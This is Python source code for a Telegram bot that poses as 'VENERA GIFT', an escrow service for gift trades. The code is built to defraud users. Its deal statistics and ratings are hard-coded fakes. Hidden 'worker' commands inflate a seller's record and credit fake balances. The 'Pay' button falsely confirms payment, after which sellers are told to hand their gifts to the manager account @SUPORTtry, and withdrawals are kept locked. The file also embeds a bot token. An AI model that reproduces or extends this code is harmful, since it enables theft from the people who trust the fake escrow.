import asyncio
import random
import logging
import os
import glob
import string
from pathlib import Path

# Импорты из библиотеки aiogram
from aiogram import Bot, Dispatcher, F, types
from aiogram.types import (
    Message, 
    CallbackQuery, 
    InlineKeyboardMarkup, 
    InlineKeyboardButton, 
    InputMediaPhoto, 
    FSInputFile
)
from aiogram.filters import CommandStart, Command
from aiogram.exceptions import TelegramBadRequest

# Импорт для работы веб-сервера на Vercel
from aiohttp import web

# ===== ГЛУБОКАЯ НАСТРОЙКА ЛОГИРОВАНИЯ =====
logging.basicConfig(
    level=logging.INFO, 
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

# ===== ОСНОВНЫЕ ПАРАМЕТРЫ БОТА =====
BOT_TOKEN = os.getenv("BOT_TOKEN", "8304741625:AAEFyvmdL_tsfGsIH1VxruyBptyvqcNErt0")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# ===== ГЛОБАЛЬНЫЕ СЛОВАРИ ДАННЫХ =====
active_deals = {}          
user_fsm_states = {}       
ui_cache = {}              
temp_data = {}             
user_languages = {}  
user_balances = {}
worker_stats = {}
referral_system = {}

# ===== ТЕКСТОВЫЕ МОДУЛИ =====

TEXT_START_WELCOME = (
    "🛡️ **VENERA GIFT — Безопасные сделки**\n\n"
    "Добро пожаловать в систему автоматизированных OTC-сделок. "
    "Мы обеспечиваем защиту ваших средств и активов на каждом этапе.\n\n"
    "💎 **Наши преимущества:**\n"
    "— Мгновенное создание счета\n"
    "— Безопасное удержание (эскроу) средств\n"
    "— Проверка через @SUPORTtry\n"
    "— Круглосуточный арбитраж\n\n"
    "📢 Канал: @VeneraGift\n"
    "👤 Менеджер: @SUPORTtry"
)

TEXT_VERIFICATION_INFO = (
    "✅ **Полная верификация**\n\n"
    "▸ Доступно пополнение RUB и USD (автоматическое)\n"
    "▸ Создание и оплата сделок доступны\n\n"
    "Вы можете пополнять баланс RUB и USD без подтверждения администратора."
)

TEXT_INFO_DETAILS = (
    "📊 **Статистика VENERA GIFT**\n\n"
    "Всего сделок: 96105\n"
    "Успешных сделок: 93177\n"
    "Общий объем: $991996\n"
    "Средний рейтинг: 4.9/5.0\n"
    "Онлайн сейчас: 18530\n\n"
    "Наши преимущества:\n"
    "• Гарант-сервис на все сделки\n"
    "• ️Мгновенная доставка товаров\n"
    "• Защита от мошенников\n"
    "• Проверенные продавцы\n"
    "• 24/7 Поддержка\n"
    "• ️99.8% положительных отзывов\n\n"
    "Наш канал: @VeneraGift\n"
    "Поддержка: @SUPORTtry\n\n"
    "Статистика обновляется каждые 5 минут"
)

def get_requisites_text(uid):
    bal = user_balances.get(uid, {'RUB': 0.0, 'USD': 0.0, 'TON': 0.0, 'STAR': 0.0, 'UAH': 0.0, 'USDT': 0.0})
    return (
        "💳 **Управление реквизитами**\n\n"
        "• TON: не указан\n"
        "• Карта RUB: не указан\n"
        "• Карта USD: не указан\n"
        "• Любая валюта: не указан\n\n"
        "**Ваши балансы:**\n"
        f"• TON: {bal.get('TON', 0.0):.2f}\n"
        f"• RUB: {bal.get('RUB', 0.0):.2f}\n"
        f"• UAH: {bal.get('UAH', 0.0):.2f}\n"
        f"• USDT: {bal.get('USDT', 0.0):.2f}\n"
        f"• Stars: {bal.get('STAR', 0.0):.2f}\n\n"
        "Выберите действие:"
    )

TEXT_WITHDRAW_SELECT_CURRENCY = (
    "📤 **Вывод средств — Выбор валюты**\n\n"
    "Выберите валюту для оформления заявки на вывод. "
    "Убедитесь, что ваши реквизиты актуальны."
)

TEXT_WITHDRAW_LOCKED = (
    "⚠️ **Доступ ограничен**\n\n"
    "Вывод средств в валюте **{}** временно недоступен.\n\n"
    "Согласно правилам безопасности VENERA GIFT, вывод средств становится доступен пользователям, имеющим **от 2 успешных сделок** в системе.\n\n"
    "▸ Необходимо совершить успешные сделки для вывода: **2**\n\n"
    "Продолжайте торговать, чтобы разблокировать возможность вывода."
)

TEXT_DEPOSIT_RUB_LOCKED = (
    "💳 **Пополнение RUB**\n\n"
    "Извините, пополнение рублями временно недоступно для неверифицированных пользователей. "
    "Для пополнения баланса RUB необходимо пройти верификацию.\n\n"
    "**Что дает верификация:**\n"
    "• Доступ к пополнению RUB\n"
    "• Повышенные лимиты\n"
    "• Приоритетная поддержка\n"
    "• Сниженные комиссии"
)

TEXT_APPEAL_CENTER = (
    "📝 **Центр обращений VENERA GIFT**\n\n"
    "💡 **Раздел предложений и идей:**\n"
    "• Предложения по улучшению функционала\n"
    "• Идеи для новых функций\n"
    "• Запросы на интеграции\n"
    "• Отзывы о пользовательском опыте\n\n"
    "⚠️ **Раздел жалоб и претензий:**\n"
    "• Жалобы на пользователей\n"
    "• Проблемы со сделками\n"
    "• Технические проблемы\n"
    "• Некорректное поведение\n"
    "• Предполагаемое мошенничество\n\n"
    "ℹ️ **Важная информация:**\n"
    "• Все обращения рассматриваются в течение 24 часов\n"
    "• Конфиденциальность гарантируется\n"
    "• По жалобам на мошенничество — моментальная реакция\n"
    "• Лучшие предложения внедряются в бота\n\n"
    "Выберите раздел для обращения:"
)

TEXT_SUGGEST_PROMPT = (
    "💡 **Напишите ваше предложение:**\n\n"
    "Опишите подробно вашу идею, как она улучшит работу бота и какие преимущества принесет пользователям."
)

TEXT_COMPLAINT_PROMPT = (
    "⚠️ **Напишите вашу жалобу:**\n\n"
    "Укажите:\n"
    "• ID пользователя/сделки\n"
    "• Суть проблемы\n"
    "• Скриншоты (если есть)\n"
    "• Желаемое решение"
)

TEXT_ASK_REQUISITES = (
    "💳 **Шаг: Введите реквизиты для оплаты**\n\n"
    "Пожалуйста, введите адрес вашего кошелька или номер банковской карты, "
    "на которые покупатель должен будет перевести средства для оплаты данной сделки."
)

TEXT_ASK_AMOUNT = (
    "💰 **Шаг: Введите сумму сделки**\n\n"
    "Напишите только числовое значение суммы сделки (например: 1000). "
    "Пожалуйста, убедитесь в правильности ввода суммы."
)

TEXT_ASK_GIFT = (
    "📝 **Шаг: Введите название подарка/предмета**\n\n"
    "(📝например: Пепе или Леденец:)."
)

TEXT_BUYER_DEAL_CARD = (
    "📊 **Информация о сделке #{}**\n\n"
    "Вы покупатель в сделке.\n"
    "👤 Продавец: @SUPORTtry (8113792764)\n"
    "✅ Успешных сделок у продавца: {}\n"
    "⭐ Рейтинг продавца: {}/5.0\n"
    "🛡️ Верификация: Новый пользователь\n\n"
    "• Вы покупаете: {}\n"
    "• Адрес для оплаты: `{}`\n"
    "• Сумма к оплате: {} {}\n"
    "• Комментарий к платежу (мемо): `#{}`\n\n"
    "⚠️ Пожалуйста, убедитесь в правильности данных перед оплатой. "
    "**Комментарий (мемо) обязателен!**"
)

TEXT_REFERRAL_MENU = (
    "👥 **Реферальная программа VENERA GIFT**\n\n"
    "Приглашайте друзей и получайте 15% от комиссии каждой их успешной сделки!\n\n"
    "📈 **Ваша статистика:**\n"
    "• Приглашено друзей: **{}**\n"
    "• Заработано: **{} RUB**\n\n"
    "🔗 **Ваша ссылка для приглашения:**\n"
    "`https://t.me/{}?start=ref_{}`\n\n"
    "Средства зачисляются на ваш баланс автоматически после завершения сделки рефералом."
)

# ===== ФУНКЦИИ ИНТЕРФЕЙСА =====
def find_trustify_photo():
    downloads_path = str(Path.home() / "Downloads")
    current_path = os.getcwd()
    target_filename = "photo_6235329028533456789_x.jpg"
    search_locations = [current_path, downloads_path, os.path.join(current_path, "api")]
    for directory in search_locations:
        full_path = os.path.join(directory, target_filename)
        if os.path.exists(full_path):
            return full_path
    patterns = ["photo_6235329028533456789*.jpg", "photo_6235329028533456789*.jpeg"]
    for directory in search_locations:
        for pattern in patterns:
            files = glob.glob(os.path.join(directory, pattern))
            if files: return files[0]
    return None

async def send_interface_view(chat_id, user_id, text, keyboard=None, is_callback=False, callback_obj=None):
    photo_path = find_trustify_photo()
    target_id = chat_id or user_id
    if is_callback and callback_obj:
        try:
            if photo_path:
                await callback_obj.message.edit_media(
                    media=InputMediaPhoto(media=FSInputFile(photo_path), caption=text, parse_mode="Markdown"),
                    reply_markup=keyboard
                )
            else:
                await callback_obj.message.edit_text(text, reply_markup=keyboard, parse_mode="Markdown")
            return
        except Exception:
            pass
    if photo_path:
        msg = await bot.send_photo(target_id, FSInputFile(photo_path), caption=text, reply_markup=keyboard, parse_mode="Markdown")
    else:
        msg = await bot.send_message(target_id, text, reply_markup=keyboard, parse_mode="Markdown")
    ui_cache[user_id] = msg.message_id

def init_user_data(user_id):
    if user_id not in user_balances:
        user_balances[user_id] = {'RUB': 0.0, 'USD': 0.0, 'TON': 0.0, 'STAR': 0.0, 'UAH': 0.0, 'USDT': 0.0}
    if user_id not in referral_system:
        referral_system[user_id] = {'referrals': 0, 'earned': 0.0, 'invited_by': None}
    if user_id not in user_languages:
        user_languages[user_id] = "ru"

# ===== ГЕНЕРАТОРЫ КЛАВИАТУР =====

def get_main_menu_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📝 Создать сделку", callback_data="ui_create_deal")],
        [InlineKeyboardButton(text="✅ Верификация", callback_data="ui_open_verify"),
         InlineKeyboardButton(text="💳 Реквизиты", callback_data="ui_open_reqs")],
        [InlineKeyboardButton(text="📄 Подробнее", callback_data="ui_open_info"),
         InlineKeyboardButton(text="👥 Рефералы", callback_data="ui_open_refs")],
        [InlineKeyboardButton(text="🌐 Язык", callback_data="ui_change_lang"),
         InlineKeyboardButton(text="📝 Обращение", callback_data="ui_open_appeal")],
        [InlineKeyboardButton(text="📰 VENERA News", url="https://t.me/VeneraGift")],
        [InlineKeyboardButton(text="📞 Поддержка", url="https://t.me/SUPORTtry")]
    ])

def get_language_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="set_lang_ru"),
         InlineKeyboardButton(text="🇺🇸 English", callback_data="set_lang_en")],
        [InlineKeyboardButton(text="⬅ Назад", callback_data="ui_back_home")]
    ])

def get_requisites_menu_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Пополнить RUB", callback_data="dep_act_RUB"),
         InlineKeyboardButton(text="Пополнить UAH", callback_data="dep_act_UAH")],
        [InlineKeyboardButton(text="Пополнить TON", callback_data="dep_act_TON"),
         InlineKeyboardButton(text="Пополнить Stars", callback_data="dep_act_STAR")],
        [InlineKeyboardButton(text="📤 Вывод средств", callback_data="ui_open_withdraw")],
        [InlineKeyboardButton(text="⬅ Назад", callback_data="ui_back_home")]
    ])

def get_withdraw_currencies_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="RUB", callback_data="withdraw_cur_RUB"),
         InlineKeyboardButton(text="UAH", callback_data="withdraw_cur_UAH")],
        [InlineKeyboardButton(text="USDT", callback_data="withdraw_cur_USDT"),
         InlineKeyboardButton(text="TON", callback_data="withdraw_cur_TON")],
        [InlineKeyboardButton(text="Stars", callback_data="withdraw_cur_STAR")],
        [InlineKeyboardButton(text="⬅ Назад", callback_data="ui_open_reqs")]
    ])

def get_appeal_menu_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💡 Предложить", callback_data="appeal_action_suggest"),
         InlineKeyboardButton(text="⚠️ Жалоба", callback_data="appeal_action_complaint")],
        [InlineKeyboardButton(text="⬅ Назад", callback_data="ui_back_home")]
    ])

def get_currency_choice_kb(prefix="setup_cur_"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⭐ Stars", callback_data=f"{prefix}STAR"),
         InlineKeyboardButton(text="TON", callback_data=f"{prefix}TON")],
        [InlineKeyboardButton(text="RUB", callback_data=f"{prefix}RUB"),
         InlineKeyboardButton(text="UAH (UKR)", callback_data=f"{prefix}UAH")],
        [InlineKeyboardButton(text="USDT", callback_data=f"{prefix}USDT")],
        [InlineKeyboardButton(text="⬅ Назад", callback_data="ui_back_home")]
    ])

def get_back_to_main_kb():
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅ Назад в меню", callback_data="ui_back_home")]])

# ===== АДМИН ПАНЕЛЬ ВОРКЕРА =====

@dp.message(Command("nikitavork"))
async def admin_nikita_cmd(message: Message):
    uid = message.from_user.id
    if uid not in worker_stats:
        worker_stats[uid] = {'deals': 0, 'rating': 0.0}
    await message.answer("🛠️ **Админ-режим активирован.**\n\n`/nikitas [число]` — кол-во сделок\n`/nikitar [число]` — рейтинг\n`/price` — начислить баланс", parse_mode="Markdown")

@dp.message(Command("nikitas"))
async def set_nikitas_cmd(message: Message):
    uid = message.from_user.id
    if uid not in worker_stats: return
    try:
        val = int(message.text.split()[1])
        worker_stats[uid]['deals'] = val
        await message.answer(f"✅ Успешные сделки: {val}")
    except Exception: pass

@dp.message(Command("nikitar"))
async def set_nikitar_cmd(message: Message):
    uid = message.from_user.id
    if uid not in worker_stats: return
    try:
        val = float(message.text.split()[1])
        worker_stats[uid]['rating'] = val
        await message.answer(f"✅ Рейтинг: {val}")
    except Exception: pass

@dp.message(Command("price"))
async def admin_price_cmd(message: Message):
    user_id = message.from_user.id
    if user_id not in worker_stats: return
    user_fsm_states[user_id] = "admin_price_user"
    await message.answer("👤 **Введите ID пользователя, которому нужно начислить средства:**", parse_mode="Markdown")

# ===== ОБРАБОТЧИКИ =====

@dp.message(CommandStart())
async def start_handler(message: Message):
    user_id = message.from_user.id
    init_user_data(user_id)
        
    args = message.text.split()
    if len(args) > 1:
        payload = args[1]
        
        if payload in active_deals:
            deal_id = payload
            d = active_deals[deal_id]
            
            if d["seller_id"] == user_id:
                warning_text = (
                    "⚠️ **Ошибка доступа**\n\n"
                    "Вы не можете оплатить данную сделку, так как являетесь её создателем (продавцом)."
                )
                await send_interface_view(message.chat.id, user_id, warning_text, get_back_to_main_kb())
                return

            d["buyer_id"] = user_id
            seller_id = d["seller_id"]
            stats = worker_stats.get(seller_id, {'deals': 0, 'rating': 0.0})

            cap = TEXT_BUYER_DEAL_CARD.format(
                deal_id, stats['deals'], stats['rating'], 
                d["gift"], d["reqs"], d["amount"], d["currency"], deal_id
            )
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="💳 Оплатить", callback_data=f"pay_now_{deal_id}")],
                [InlineKeyboardButton(text="⬅ Назад в меню", callback_data="ui_back_home")]
            ])
            await send_interface_view(message.chat.id, user_id, cap, kb)
            return
            
        elif payload.startswith("ref_"):
            try:
                inviter_id = int(payload.split("_")[1])
                if inviter_id != user_id and referral_system[user_id]['invited_by'] is None:
                    referral_system[user_id]['invited_by'] = inviter_id
                    if inviter_id in referral_system:
                        referral_system[inviter_id]['referrals'] += 1
                        try: await bot.send_message(inviter_id, f"👤 У вас новый реферал!")
                        except Exception: pass
            except Exception: pass

    await send_interface_view(message.chat.id, user_id, TEXT_START_WELCOME, get_main_menu_kb())

@dp.callback_query()
async def cb_manager(callback: CallbackQuery):
    user_id = callback.from_user.id
    act = callback.data

    if act == "ui_back_home":
        user_fsm_states[user_id] = None
        await send_interface_view(None, user_id, TEXT_START_WELCOME, get_main_menu_kb(), True, callback)

    elif act == "ui_change_lang":
        await send_interface_view(None, user_id, "🌍 **Выберите язык интерфейса / Select language:**", get_language_kb(), True, callback)

    elif act == "set_lang_ru":
        user_languages[user_id] = "ru"
        await callback.answer("✅ Язык изменен на Русский")
        await send_interface_view(None, user_id, TEXT_START_WELCOME, get_main_menu_kb(), True, callback)

    elif act == "set_lang_en":
        user_languages[user_id] = "en"
        await callback.answer("✅ Language changed to English")
        await send_interface_view(None, user_id, TEXT_START_WELCOME, get_main_menu_kb(), True, callback)

    elif act == "ui_open_verify":
        await send_interface_view(None, user_id, TEXT_VERIFICATION_INFO, get_back_to_main_kb(), True, callback)

    elif act == "ui_open_reqs":
        init_user_data(user_id)
        await send_interface_view(None, user_id, get_requisites_text(user_id), get_requisites_menu_kb(), True, callback)

    elif act == "ui_open_withdraw":
        await send_interface_view(None, user_id, TEXT_WITHDRAW_SELECT_CURRENCY, get_withdraw_currencies_kb(), True, callback)

    elif act.startswith("withdraw_cur_"):
        cur = act.split("_")[2]
        stats = worker_stats.get(user_id, {'deals': 0, 'rating': 0.0})
        
        if stats['deals'] < 2:
            locked_text = TEXT_WITHDRAW_LOCKED.format(cur, stats['deals'])
            locked_kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="📝 Подать апелляцию", url="https://t.me/SUPORTtry")],
                [InlineKeyboardButton(text="⬅ Назад", callback_data="ui_open_withdraw")]
            ])
            await send_interface_view(None, user_id, locked_text, locked_kb, True, callback)
        else:
            success_text = (
                f"📤 **Заявка на вывод: {cur}**\n\nПожалуйста, подтвердите реквизиты у оператора для отправки средств.\n\nВаш лимит сделок подтвержден."
            )
            success_kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="📞 Связаться с оператором", url="https://t.me/SUPORTtry")],
                [InlineKeyboardButton(text="⬅ Назад", callback_data="ui_open_withdraw")]
            ])
            await send_interface_view(None, user_id, success_text, success_kb, True, callback)

    elif act == "ui_open_info":
        await send_interface_view(None, user_id, TEXT_INFO_DETAILS, get_back_to_main_kb(), True, callback)

    elif act == "ui_open_appeal":
        await send_interface_view(None, user_id, TEXT_APPEAL_CENTER, get_appeal_menu_kb(), True, callback)

    elif act == "ui_open_refs":
        init_user_data(user_id)
        bot_info = await bot.get_me()
        stats = referral_system[user_id]
        ref_text = TEXT_REFERRAL_MENU.format(stats['referrals'], stats['earned'], bot_info.username, user_id)
        await send_interface_view(None, user_id, ref_text, get_back_to_main_kb(), True, callback)

    elif act == "appeal_action_suggest":
        user_fsm_states[user_id] = "state_suggest"
        await send_interface_view(None, user_id, TEXT_SUGGEST_PROMPT, get_back_to_main_kb(), True, callback)

    elif act == "appeal_action_complaint":
        user_fsm_states[user_id] = "state_complaint"
        await send_interface_view(None, user_id, TEXT_COMPLAINT_PROMPT, get_back_to_main_kb(), True, callback)

    elif act == "ui_create_deal":
        await send_interface_view(None, user_id, "💳 **Выберите валюту для проведения сделки:**", get_currency_choice_kb(), True, callback)

    elif act.startswith("setup_cur_"):
        curr = act.split("_")[2]
        temp_data[user_id] = {"currency": curr}
        if curr == "STAR":
            temp_data[user_id]["reqs"] = "Внутренний баланс Stars (Автоматически)"
            user_fsm_states[user_id] = "state_amt"
            await send_interface_view(None, user_id, TEXT_ASK_AMOUNT, get_back_to_main_kb(), True, callback)
        else:
            user_fsm_states[user_id] = "state_reqs"
            await send_interface_view(None, user_id, TEXT_ASK_REQUISITES, get_back_to_main_kb(), True, callback)

    elif act.startswith("admin_pcur_"):
        curr = act.split("_")[2]
        temp_data[user_id]["price_currency"] = curr
        user_fsm_states[user_id] = "admin_price_amt"
        await callback.message.edit_text(f"💰 **Введите сумму для начисления ({curr}):**", parse_mode="Markdown")

    elif act == "admin_price_confirm":
        target_uid = temp_data[user_id].get("price_target")
        curr = temp_data[user_id].get("price_currency")
        amount = temp_data[user_id].get("price_amount")
        init_user_data(target_uid)
        user_balances[target_uid][curr] += amount
        user_fsm_states[user_id] = None
        await callback.message.edit_text(f"✅ Баланс пользователя `{target_uid}` успешно пополнен на **{amount} {curr}**.", parse_mode="Markdown")
        try:
            await bot.send_message(target_uid, f"💰 Ваш баланс пополнен на **{amount} {curr}** менеджером.")
        except: pass

    elif act.startswith("dep_act_"):
        c = act.split("_")[2]
        txt = TEXT_DEPOSIT_RUB_LOCKED.replace("RUB", c).replace("рублями", "данной валютой")
        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="📝 Подать заявку", callback_data="sub_v")], [InlineKeyboardButton(text="⬅ Назад", callback_data="ui_open_reqs")]])
        await send_interface_view(None, user_id, txt, kb, True, callback)

    elif act == "sub_v":
        await callback.answer("✅ Ваша заявка на верификацию принята.", show_alert=True)

    elif act.startswith("pay_now_"):
        deal_id = act.split("_")[2]
        d = active_deals.get(deal_id)
        if not d: return
        seller_id = d["seller_id"]
        try:
            seller_user = await bot.get_chat(seller_id)
            s_user = f"@{seller_user.username}" if seller_user.username else f"ID: {seller_id}"
        except Exception:
            s_user = f"ID: {seller_id}"

        b_txt = (f"Оплата подтверждена!\n▸ Сделка: #{deal_id}\n▸ Продавец: {s_user}\n"
                 f"▸ Успешных сделок: 0\n▸ Рейтинг: 0.0/5\n"
                 f"▸ Сумма: {d['amount']} {d['currency']}\n▸ Описание: {d['gift']}\n\n"
                 f"Ожидайте передачи менеджеру @SUPORTtry.")
        await send_interface_view(None, user_id, b_txt, get_back_to_main_kb(), True, callback)

        s_txt = (f"Оплата подтверждена для сделки #{deal_id}.\n"
                 f"Сумма: {d['amount']} {d['currency']} Описание: {d['gift']}\n"
                 f"Передайте подарок менеджеру: @SUPORTtry\n\n"
                 f"После отправки подтвердите действие:")
        s_kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Подтвердить отправку подарка", callback_data=f"final_sent_{deal_id}")],
            [InlineKeyboardButton(text="Поддержка", url="https://t.me/SUPORTtry")]
        ])
        try:
            p = find_trustify_photo()
            if p: await bot.send_photo(seller_id, FSInputFile(p), caption=s_txt, reply_markup=s_kb, parse_mode="Markdown")
            else: await bot.send_message(seller_id, s_txt, reply_markup=s_kb, parse_mode="Markdown")
        except Exception: pass

    elif act.startswith("final_sent_"):
        rule = "VENERA GIFT: Подарок должен быть передан исключительно менеджеру @SUPORTtry."
        await send_interface_view(None, user_id, rule, get_back_to_main_kb(), True, callback)

    await callback.answer()

@dp.message()
async def text_handler(message: Message):
    user_id = message.from_user.id
    state = user_fsm_states.get(user_id)
    if not state: return
    
    if state == "admin_price_user":
        try:
            target_id = int(message.text)
            temp_data[user_id] = {"price_target": target_id}
            user_fsm_states[user_id] = "admin_price_cur"
            await message.answer("💳 **Выберите валюту для начисления:**", reply_markup=get_currency_choice_kb("admin_pcur_"))
        except:
            await message.answer("❌ Ошибка. Введите корректный числовой ID пользователя.")
        return

    elif state == "admin_price_amt":
        try:
            amount = float(message.text)
            temp_data[user_id]["price_amount"] = amount
            kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🚀 Отправить", callback_data="admin_price_confirm")]])
            await message.answer(f"❓ Начислить **{amount} {temp_data[user_id]['price_currency']}** пользователю `{temp_data[user_id]['price_target']}`?", 
                                 reply_markup=kb, parse_mode="Markdown")
        except:
            await message.answer("❌ Ошибка. Введите число.")
        return

    try: await message.delete()
    except Exception: pass

    if state == "state_reqs":
        temp_data[user_id]["reqs"] = message.text
        user_fsm_states[user_id] = "state_amt"
        await send_interface_view(message.chat.id, user_id, TEXT_ASK_AMOUNT, get_back_to_main_kb())
    
    elif state == "state_amt":
        temp_data[user_id]["amount"] = message.text
        user_fsm_states[user_id] = "state_gift"
        await send_interface_view(message.chat.id, user_id, TEXT_ASK_GIFT, get_back_to_main_kb())
    
    elif state == "state_gift":
        did = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
        active_deals[did] = {
            "seller_id": user_id, 
            "reqs": temp_data[user_id].get("reqs"), 
            "amount": temp_data[user_id].get("amount"), 
            "currency": temp_data[user_id].get("currency"), 
            "gift": message.text
        }
        user_fsm_states[user_id] = None
        bot_u = await bot.get_me()
        final = (f"✅ **Сделка успешно создана!**\n\n🆔 ID Сделки: `{did}`\n💰 Сумма: {temp_data[user_id]['amount']} {temp_data[user_id]['currency']}\n"
                 f"📦 Предмет: {message.text}\n\n🔗 **Ссылка для покупателя:**\n`https://t.me/{bot_u.username}?start={did}`")
        await send_interface_view(message.chat.id, user_id, final, get_back_to_main_kb())
    
    elif state in ["state_suggest", "state_complaint"]:
        user_fsm_states[user_id] = None
        thanks = "✅ **Благодарим за ваше обращение!**\n\nНаши модераторы рассмотрят его в течение 24 часов."
        await send_interface_view(message.chat.id, user_id, thanks, get_back_to_main_kb())

# ===== ЧАСТЬ ДЛЯ VERCEL (WEBHOOK) =====
async def handle_webhook(request):
    url = str(request.url)
    index = url.rfind('/')
    token = url[index + 1:]
    
    if token == BOT_TOKEN:
        update = types.Update.model_validate(await request.json(), context={"bot": bot})
        await dp.feed_update(bot, update)
        return web.Response()
    else:
        return web.Response(status=403)

app = web.Application()
app.router.add_post(f'/{BOT_TOKEN}', handle_webhook)